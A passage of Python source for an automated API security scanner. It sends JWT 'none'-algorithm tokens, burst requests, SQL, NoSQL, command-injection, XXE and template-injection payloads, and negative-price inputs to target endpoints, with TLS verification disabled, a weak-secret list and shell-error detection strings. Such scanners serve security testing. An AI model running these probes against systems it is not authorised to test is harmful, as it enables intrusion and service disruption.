            response = requests.get(
                endpoint.url,
                headers=headers,
                timeout=10,
                verify=False,
            )
            
            if response.status_code == 200:
                results.append(APITestResult(
                    endpoint=endpoint.url,
                    test_type='jwt_none_alg',
                    vulnerability=APIVulnerability.JWT_WEAKNESSES,
                    severity='High',
                    confidence=0.9,
                    evidence='JWT with "none" algorithm accepted',
                    description='JWT implementation accepts tokens with "none" algorithm',
                    remediation='Reject JWT tokens with "none" algorithm',
                    request_data={'token': none_token},
                    response_data={'status_code': response.status_code},
                ))
        
        except requests.RequestException:
            pass
        
        # Test 2: Weak HMAC key brute force (conceptual test)
        # We can't actually brute force, but we can check for common weaknesses
        common_secrets = ['secret', 'password', 'changeme', '123456', 'qwerty']
        
        for secret in common_secrets:
            try:
                import hmac
                import hashlib
                
                # This is just to demonstrate the concept
                # In real testing, we'd need a valid token to test against
                pass
            
            except ImportError:
                break
        
        return results
    
    def _test_api_key_authentication(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test API key authentication for vulnerabilities."""
        results = []
        
        # Test for API key leakage via URL parameters
        if '?' in endpoint.url:
            query_params = urlparse(endpoint.url).query
            sensitive_params = ['apikey', 'api_key', 'key', 'token', 'secret']
            
            if any(param in query_params.lower() for param in sensitive_params):
                results.append(APITestResult(
                    endpoint=endpoint.url,
                    test_type='api_key_url',
                    vulnerability=APIVulnerability.API_KEY_LEAKAGE,
                    severity='Medium',
                    confidence=0.8,
                    evidence='API key potentially exposed in URL',
                    description='API key passed via URL parameter (visible in logs, browser history)',
                    remediation='Pass API keys in headers instead of URL parameters',
                    request_data={'url': endpoint.url},
                    response_data={},
                ))
        
        return results
    
    def _test_rate_limiting(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test API rate limiting."""
        results = []
        
        if not self.enable_rate_limit_testing:
            return results
        
        # Track rate limit testing for this endpoint
        endpoint_key = hashlib.md5(endpoint.url.encode()).hexdigest()[:8]
        
        if endpoint_key not in self.rate_limit_trackers:
            self.rate_limit_trackers[endpoint_key] = {
                'endpoint': endpoint.url,
                'requests': [],
                'rate_limit_hit': False,
            }
        
        tracker = self.rate_limit_trackers[endpoint_key]
        
        # Send rapid requests to test rate limiting
        request_count = 0
        start_time = time.time()
        
        while time.time() - start_time < 5:  # Test for 5 seconds
            try:
                headers = {}
                if endpoint.requires_auth and self.custom_auth_tokens:
                    headers.update(self.custom_auth_tokens)
                
                response = requests.request(
                    endpoint.method,
                    endpoint.url,
                    headers=headers,
                    timeout=5,
                    verify=False,
                )
                
                request_count += 1
                tracker['requests'].append({
                    'timestamp': time.time(),
                    'status_code': response.status_code,
                })
                
                # Check for rate limit response
                if response.status_code == 429:  # Too Many Requests
                    tracker['rate_limit_hit'] = True
                    results.append(APITestResult(
                        endpoint=endpoint.url,
                        test_type='rate_limit',
                        vulnerability=APIVulnerability.LACK_OF_RESOURCES_RATE_LIMITING,
                        severity='Informational',
                        confidence=0.9,
                        evidence=f'Rate limit hit after {request_count} requests in 5 seconds',
                        description='Rate limiting is properly implemented',
                        remediation='Consider adjusting rate limits based on application needs',
                        request_data={'requests_sent': request_count},
                        response_data={'status_code': 429, 'headers': dict(response.headers)},
                    ))
                    break
                
                time.sleep(0.1)  # Small delay between requests
            
            except requests.RequestException:
                break
        
        # If no rate limit was hit after many requests
        if not tracker['rate_limit_hit'] and request_count > 50:
            results.append(APITestResult(
                endpoint=endpoint.url,
                test_type='rate_limit_missing',
                vulnerability=APIVulnerability.LACK_OF_RESOURCES_RATE_LIMITING,
                severity='Medium',
                confidence=0.7,
                evidence=f'No rate limit detected after {request_count} requests',
                description='Endpoint may be vulnerable to DoS attacks',
                remediation='Implement rate limiting for all API endpoints',
                request_data={'requests_sent': request_count},
                response_data={'test_duration': 5},
            ))
        
        return results
    
    def _test_injection_vulnerabilities(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test for injection vulnerabilities."""
        results = []
        
        if not self.enable_fuzzing:
            return results
        
        # Determine intensity level
        payload_count = {
            'low': 3,
            'medium': 10,
            'high': 25,
        }.get(self.fuzzing_intensity, 10)
        
        # Test SQL injection
        sql_payloads = self.injection_payloads['sql_injection'][:payload_count]
        sql_results = self._test_sql_injection(endpoint, sql_payloads)
        results.extend(sql_results)
        
        # Test NoSQL injection (for JSON APIs)
        if endpoint.api_type in [APIType.REST, APIType.GRAPHQL]:
            nosql_payloads = self.injection_payloads['nosql_injection'][:payload_count]
            nosql_results = self._test_nosql_injection(endpoint, nosql_payloads)
            results.extend(nosql_results)
        
        # Test command injection
        command_payloads = self.injection_payloads['command_injection'][:payload_count]
        command_results = self._test_command_injection(endpoint, command_payloads)
        results.extend(command_results)
        
        # Test XXE (for XML APIs)
        if endpoint.api_type in [APIType.REST, APIType.SOAP]:
            xxe_payloads = self.injection_payloads['xxe'][:payload_count]
            xxe_results = self._test_xxe(endpoint, xxe_payloads)
            results.extend(xxe_results)
        
        # Test SSTI
        ssti_payloads = self.injection_payloads['ssti'][:payload_count]
        ssti_results = self._test_ssti(endpoint, ssti_payloads)
        results.extend(ssti_results)
        
        return results

    def _test_command_injection(self, endpoint: APIEndpoint, payloads: List[str]) -> List[APITestResult]:
        """Test for command injection vulnerabilities."""
        results = []
        
        for payload in payloads:
            try:
                test_cases = []
                
                if '?' in endpoint.url:
                    test_cases.append(('query', {'cmd': payload}))
                
                if endpoint.method in ['POST', 'PUT', 'PATCH']:
                    test_cases.append(('json', {'cmd': payload}))
                
                for param_type, test_data in test_cases:
                    headers = {'Content-Type': 'application/json'} if param_type == 'json' else {}
                    if endpoint.requires_auth and self.custom_auth_tokens:
                        headers.update(self.custom_auth_tokens)
                    
                    if param_type == 'query':
                        response = requests.request(
                            endpoint.method,
                            endpoint.url,
                            params=test_data,
                            headers=headers,
                            timeout=10,
                            verify=False,
                        )
                    else:
                        response = requests.request(
                            endpoint.method,
                            endpoint.url,
                            json=test_data,
                            headers=headers,
                            timeout=10,
                            verify=False,
                        )
                    
                    response_text = response.text.lower()
                    error_indicators = ['not found', 'command not found', 'sh:', 'bash:', 'syntax error']
                    
                    if any(indicator in response_text for indicator in error_indicators):
                        results.append(APITestResult(
                            endpoint=endpoint.url,
                            test_type='command_injection',
                            vulnerability=APIVulnerability.INJECTION,
                            severity='High',
                            confidence=0.6,
                            evidence=f'Command error with payload: {payload[:50]}',
                            description='Potential command injection vulnerability',
                            remediation='Validate inputs and avoid command execution from user data',
                            request_data={'payload': payload, 'param_type': param_type},
                            response_data={'status_code': response.status_code, 'error_snippet': response.text[:200]},
                        ))
                        break
            
            except requests.RequestException:
                continue
        
        return results

    def _test_xxe(self, endpoint: APIEndpoint, payloads: List[str]) -> List[APITestResult]:
        """Test for XXE vulnerabilities."""
        results = []
        
        for payload in payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                if endpoint.requires_auth and self.custom_auth_tokens:
                    headers.update(self.custom_auth_tokens)
                
                response = requests.request(
                    endpoint.method,
                    endpoint.url,
                    data=payload,
                    headers=headers,
                    timeout=10,
                    verify=False,
                )
                
                response_text = response.text.lower()
                error_indicators = ['doctype', 'entity', 'xml', 'parser', 'external entity']
                
                if any(indicator in response_text for indicator in error_indicators):
                    results.append(APITestResult(
                        endpoint=endpoint.url,
                        test_type='xxe',
                        vulnerability=APIVulnerability.INJECTION,
                        severity='High',
                        confidence=0.6,
                        evidence='XML parser behavior suggests possible XXE handling',
                        description='Potential XML External Entity (XXE) vulnerability',
                        remediation='Disable external entities and use secure XML parsers',
                        request_data={'payload': payload[:200]},
                        response_data={'status_code': response.status_code, 'error_snippet': response.text[:200]},
                    ))
                    break
            
            except requests.RequestException:
                continue
        
        return results

    def _test_ssti(self, endpoint: APIEndpoint, payloads: List[str]) -> List[APITestResult]:
        """Test for server-side template injection (SSTI) vulnerabilities."""
        results = []
        
        for payload in payloads:
            try:
                test_cases = []
                
                if '?' in endpoint.url:
                    test_cases.append(('query', {'tpl': payload}))
                
                if endpoint.method in ['POST', 'PUT', 'PATCH']:
                    test_cases.append(('json', {'template': payload}))
                
                for param_type, test_data in test_cases:
                    headers = {'Content-Type': 'application/json'} if param_type == 'json' else {}
                    if endpoint.requires_auth and self.custom_auth_tokens:
                        headers.update(self.custom_auth_tokens)
                    
                    if param_type == 'query':
                        response = requests.request(
                            endpoint.method,
                            endpoint.url,
                            params=test_data,
                            headers=headers,
                            timeout=10,
                            verify=False,
                        )
                    else:
                        response = requests.request(
                            endpoint.method,
                            endpoint.url,
                            json=test_data,
                            headers=headers,
                            timeout=10,
                            verify=False,
                        )
                    
                    response_text = response.text.lower()
                    indicators = ['template', 'jinja', 'thymeleaf', 'freemarker', 'velocity', 'expression', 'render']
                    
                    if any(indicator in response_text for indicator in indicators):
                        results.append(APITestResult(
                            endpoint=endpoint.url,
                            test_type='ssti',
                            vulnerability=APIVulnerability.INJECTION,
                            severity='High',
                            confidence=0.5,
                            evidence='Template error keywords in response',
                            description='Potential server-side template injection vulnerability',
                            remediation='Avoid rendering user input in templates; sanitize inputs',
                            request_data={'payload': payload[:100], 'param_type': param_type},
                            response_data={'status_code': response.status_code, 'error_snippet': response.text[:200]},
                        ))
                        break
            
            except requests.RequestException:
                continue
        
        return results
    
    def _test_sql_injection(self, endpoint: APIEndpoint, payloads: List[str]) -> List[APITestResult]:
        """Test for SQL injection vulnerabilities."""
        results = []
        
        for payload in payloads:
            try:
                # Test with different parameter locations
                test_cases = []
                
                # Query parameters
                if '?' in endpoint.url:
                    test_cases.append(('query', {'test': payload}))
                
                # JSON body for POST/PUT
                if endpoint.method in ['POST', 'PUT', 'PATCH']:
                    test_cases.append(('json', {'input': payload}))
                
                for param_type, test_data in test_cases:
                    headers = {'Content-Type': 'application/json'} if param_type == 'json' else {}
                    
                    if endpoint.requires_auth and self.custom_auth_tokens:
                        headers.update(self.custom_auth_tokens)
                    
                    if param_type == 'query':
                        response = requests.request(
                            endpoint.method,
                            endpoint.url,
                            params=test_data,
                            headers=headers,
                            timeout=10,
                            verify=False,
                        )
                    else:  # json
                        response = requests.request(
                            endpoint.method,
                            endpoint.url,
                            json=test_data,
                            headers=headers,
                            timeout=10,
                            verify=False,
                        )
                    
                    # Check for SQL error indicators
                    error_indicators = ['sql', 'syntax', 'mysql', 'postgresql', 'oracle', 'database']
                    response_text = response.text.lower()
                    
                    if any(indicator in response_text for indicator in error_indicators):
                        results.append(APITestResult(
                            endpoint=endpoint.url,
                            test_type='sql_injection',
                            vulnerability=APIVulnerability.INJECTION,
                            severity='High',
                            confidence=0.8,
                            evidence=f'SQL error found with payload: {payload[:50]}',
                            description='Potential SQL injection vulnerability',
                            remediation='Use parameterized queries and input validation',
                            request_data={'payload': payload, 'param_type': param_type},
                            response_data={'status_code': response.status_code, 'error_snippet': response.text[:200]},
                        ))
                        break
                
            except requests.RequestException:
                continue
        
        return results
    
    def _test_nosql_injection(self, endpoint: APIEndpoint, payloads: List[Dict]) -> List[APITestResult]:
        """Test for NoSQL injection vulnerabilities."""
        results = []
        
        for payload in payloads:
            try:
                headers = {'Content-Type': 'application/json'}
                if endpoint.requires_auth and self.custom_auth_tokens:
                    headers.update(self.custom_auth_tokens)
                
                response = requests.request(
                    endpoint.method,
                    endpoint.url,
                    json=payload,
                    headers=headers,
                    timeout=10,
                    verify=False,
                )
                
                # Check for NoSQL error indicators
                error_indicators = ['mongodb', 'bson', 'unexpected', 'operator', 'query']
                response_text = response.text.lower()
                
                if any(indicator in response_text for indicator in error_indicators):
                    results.append(APITestResult(
                        endpoint=endpoint.url,
                        test_type='nosql_injection',
                        vulnerability=APIVulnerability.INJECTION,
                        severity='High',
                        confidence=0.7,
                        evidence='NoSQL error found in response',
                        description='Potential NoSQL injection vulnerability',
                        remediation='Validate and sanitize all input, use parameterized queries',
                        request_data={'payload': str(payload)[:100]},
                        response_data={'status_code': response.status_code, 'error_snippet': response.text[:200]},
                    ))
                    break
            
            except requests.RequestException:
                continue
        
        return results
    
    def _test_information_disclosure(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test for information disclosure vulnerabilities."""
        results = []
        
        try:
            # Make request without authentication
            headers = {}
            
            # Don't send auth tokens even if available
            response = requests.request(
                endpoint.method,
                endpoint.url,
                headers=headers,
                timeout=10,
                verify=False,
            )
            
            # Check for sensitive information in response
            sensitive_patterns = [
                (r'(?i)password.*:', 'Password in response'),
                (r'(?i)apikey.*:', 'API key in response'),
                (r'(?i)token.*:', 'Token in response'),
                (r'(?i)secret.*:', 'Secret in response'),
                (r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', 'UUID in response'),
                (r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b', 'Phone number in response'),
                (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'Email in response'),
                (r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', 'IP address in response'),
            ]
            
            for pattern, description in sensitive_patterns:
                matches = re.findall(pattern, response.text)
                if matches:
                    results.append(APITestResult(
                        endpoint=endpoint.url,
                        test_type='info_disclosure',
                        vulnerability=APIVulnerability.INFORMATION_DISCLOSURE,
                        severity='Medium',
                        confidence=0.8,
                        evidence=f'{description}: {matches[0][:50]}',
                        description='Sensitive information disclosed in API response',
                        remediation='Remove sensitive data from responses, implement proper filtering',
                        request_data={},
                        response_data={'status_code': response.status_code, 'match': matches[0][:50]},
                    ))
                    break
        
        except requests.RequestException:
            pass
        
        return results
    
    def _test_business_logic(self, endpoint: APIEndpoint) -> List[APITestResult]:
        """Test for business logic vulnerabilities."""
        results = []
        
        # This is a simplified example - real business logic testing would
        # require understanding the application's specific business rules
        
        # Example: Check for price manipulation
        if 'price' in endpoint.url.lower() or 'amount' in endpoint.url.lower():
            # Try negative price
            try:
                headers = {'Content-Type': 'application/json'}
                if endpoint.requires_auth and self.custom_auth_tokens:
                    headers.update(self.custom_auth_tokens)
                
                test_payload = {'price': -1.00, 'amount': -100}
                
                response = requests.request(
                    endpoint.method,
                    endpoint.url,
                    json=test_payload,
                    headers=headers,
                    timeout=10,
                    verify=False,
                )
                
                if response.status_code == 200:
                    results.append(APITestResult(
                        endpoint=endpoint.url,
                        test_type='business_logic_price',
                        vulnerability=APIVulnerability.BUSINESS_LOGIC_FLAW,
                        severity='Medium',
                        confidence=0.6,
                        evidence='Negative price/amount accepted',
                        description='Business logic flaw allowing negative values',
                        remediation='Implement validation for business logic constraints',
                        request_data={'payload': test_payload},
                        response_data={'status_code': response.status_code},
                    ))
            
            except requests.RequestException:
                pass
        
        return results
    
    def _calculate_risk_score(self) -> float:
        """Calculate overall risk score based on vulnerabilities found."""
        if not self.test_results:
            return 0.0
        
        total_weight = 0.0
        total_severity = 0.0
        
        for result in self.test_results:
            severity_weight = self.severity_weights.get(result.severity, 1.0)
            total_weight += severity_weight
            total_severity += severity_weight * result.confidence
        
        if total_weight == 0:
            return 0.0
        
        # Normalize to 0-10 scale
        raw_score = (total_severity / total_weight) * 10
        
        # Adjust based on number of vulnerabilities
        vulnerability_factor = min(len(self.test_results) / 10, 2.0)  # Cap at 2x multiplier
        
        return min(raw_score * vulnerability_factor, 10.0)
    
    def _determine_risk_level(self, risk_score: float) -> str:
        """Determine risk level based on score."""
        if risk_score >= 8.0:
            return 'Critical'
        elif risk_score >= 6.0:
            return 'High'
        elif risk_score >= 4.0:
            return 'Medium'
        elif risk_score >= 2.0:
            return 'Low'
        else:
            return 'Informational'
    
    def _generate_security_recommendations(self) -> List[str]:
        """Generate security recommendations based on findings."""
        recommendations = []
        vulnerability_counts = defaultdict(int)
        
        # Count vulnerabilities by type
        for result in self.test_results:
            vulnerability_counts[result.vulnerability.value] += 1
        
        # Generate recommendations based on common vulnerabilities
        
        # Injection vulnerabilities
        if any(vuln in vulnerability_counts for vuln in ['injection', 'sql', 'nosql', 'xxe']):
            recommendations.extend([
                'Implement input validation and sanitization for all user inputs',
                'Use parameterized queries or prepared statements for database access',
                'Disable external entity processing in XML parsers',
            ])
        
        # Authentication vulnerabilities
        if any(vuln in vulnerability_counts for vuln in ['broken_auth', 'jwt_weakness', 'api_key_leak']):
            recommendations.extend([
                'Implement strong authentication mechanisms',
                'Use secure JWT practices (proper algorithms, validation)',
                'Store API keys securely and rotate them regularly',
            ])
        
        # Authorization vulnerabilities
        if any(vuln in vulnerability_counts for vuln in ['bola', 'bfa', 'idor']):
            recommendations.extend([
                'Implement proper authorization checks for all resources',
                'Use role-based access control (RBAC)',
                'Validate user permissions on every request',
            ])
        
        # Rate limiting
        if 'no_rate_limit' in vulnerability_counts:
            recommendations.extend([
                'Implement rate limiting for all API endpoints',
                'Use sliding window or token bucket algorithms',
                'Monitor for unusual traffic patterns',
            ])
        
        # Information disclosure
        if 'info_disclosure' in vulnerability_counts:
            recommendations.extend([
                'Remove sensitive information from API responses',
                'Implement proper error handling without leaking details',
                'Use data masking for sensitive fields',
            ])
        
        # GraphQL specific
        if any(vuln in vulnerability_counts for vuln in ['graphql_introspection', 'graphql_depth', 'graphql_batching']):
            recommendations.extend([
                'Disable GraphQL introspection in production',
                'Implement query depth and complexity limiting',
                'Consider disabling query batching or implementing limits',
            ])
        
        # General recommendations
        recommendations.extend([
            'Implement comprehensive logging and monitoring',
            'Use HTTPS for all API communications',
            'Regularly update and patch API dependencies',
            'Conduct regular security assessments and penetration tests',
        ])
        
        # Remove duplicates and return
        return list(set(recommendations))
    
    def _get_top_vulnerabilities(self, limit: int = 5) -> List[Dict[str, Any]]:
        """Get the top vulnerabilities by severity and confidence."""
        if not self.test_results:
            return []
        
        # Sort by severity weight and confidence
        def vulnerability_sort_key(result: APITestResult) -> float:
            severity_weight = self.severity_weights.get(result.severity, 1.0)
            return severity_weight * result.confidence
        
        sorted_results = sorted(self.test_results, key=vulnerability_sort_key, reverse=True)
        
        top_vulnerabilities = []
        for result in sorted_results[:limit]:
            top_vulnerabilities.append({
                'endpoint': result.endpoint,
                'vulnerability': result.vulnerability.value,
                'severity': result.severity,
                'confidence': result.confidence,
                'description': result.description,
            })
        
        return top_vulnerabilities
    
    def generate_detailed_report(self, base_url: str) -> Dict[str, Any]:
        """Generate detailed API security report."""
        # Perform comprehensive scan
        security_report = self.perform_comprehensive_api_security_scan(base_url)
        
        # Convert to dictionary for serialization
        report_dict = {
            'target': security_report.target,
            'scan_date': security_report.scan_date.isoformat(),
            'endpoints_tested': security_report.endpoints_tested,
            'vulnerabilities_found': security_report.vulnerabilities_found,
            'risk_score': security_report.risk_score,
            'risk_level': security_report.risk_level,
            'top_vulnerabilities': security_report.top_vulnerabilities,
            'recommendations': security_report.recommendations,
            'scan_statistics': dict(self.scan_statistics),
            'detailed_results': [],
        }
        
        # Add detailed results (limited to top 20)
        for result in security_report.test_results[:20]:
            report_dict['detailed_results'].append({
                'endpoint': result.endpoint,
                'test_type': result.test_type,
                'vulnerability': result.vulnerability.value,
                'severity': result.severity,
                'confidence': result.confidence,
                'evidence': result.evidence,
                'description': result.description,
                'remediation': result.remediation,
            })
        
        return report_dict
    
    def cleanup(self):
        """Cleanup resources."""
        self.executor.shutdown(wait=False)
        
        # Clear caches
        self.discovered_endpoints.clear()
        self.test_results.clear()
        self.session_cache.clear()
        self.rate_limit_trackers.clear()
        
        logger.info("APISecurityAnalyzer cleaned up")

# Helper functions for API discovery
def normalize_api_url(url: str) -> str:
    """Normalize API URL by removing common variations."""
    # Remove trailing slash
    if url.endswith('/'):
        url = url[:-1]
    
    # Remove version numbers for comparison
    url = re.sub(r'/v\d+/', '/vX/', url)
    url = re.sub(r'/api/v\d+/', '/api/vX/', url)
    
    return url

# Export the main class
__all__ = ['AdvancedAPISecurityAnalyzer', 'APIType', 'APIVulnerability', 
           'APIEndpoint', 'APITestResult', 'APISecurityReport', 'normalize_api_url']